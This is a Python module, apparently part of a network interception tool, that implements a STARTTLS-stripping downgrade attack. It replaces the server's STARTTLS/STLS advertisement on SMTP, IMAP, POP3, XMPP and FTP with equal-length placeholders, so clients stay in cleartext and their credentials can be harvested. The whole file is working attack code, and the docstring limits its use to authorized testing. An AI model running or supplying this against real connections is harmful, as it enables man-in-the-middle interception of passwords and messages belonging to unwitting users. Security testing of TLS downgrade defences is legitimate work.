"""STARTTLS stripping.

Prevents opportunistic TLS upgrade on SMTP/IMAP/POP3/XMPP/FTP by mangling the
server's STARTTLS/STLS advertisement so the client never requests encryption and
the session stays cleartext (harvestable). The keyword is replaced with an
equal-length placeholder, so the packet length is unchanged — no seq/ack fix-up
needed inline.

For authorized testing only.
"""

from __future__ import annotations

from dataclasses import dataclass

from reforge.rules.base import Action, Verdict

# (token, equal-length replacement)
_TOKENS = [(b"STARTTLS", b"XXXXXXXX"), (b"STLS", b"XXXX")]


def strip_starttls(data: bytes) -> tuple[bytes, bool]:
    changed = False
    for tok, rep in _TOKENS:
        if tok in data:
            data = data.replace(tok, rep)
            changed = True
    return data, changed


@dataclass
class StripStartTLS(Action):
    def apply(self, pkt, verdict: Verdict) -> None:
        from scapy.packet import Raw

        p = pkt.scapy()
        if not p.haslayer(Raw):
            return
        new, changed = strip_starttls(bytes(p[Raw].load))
        if changed:
            p[Raw].load = new
            pkt.modified = True
            verdict.notes.append("strip-starttls")
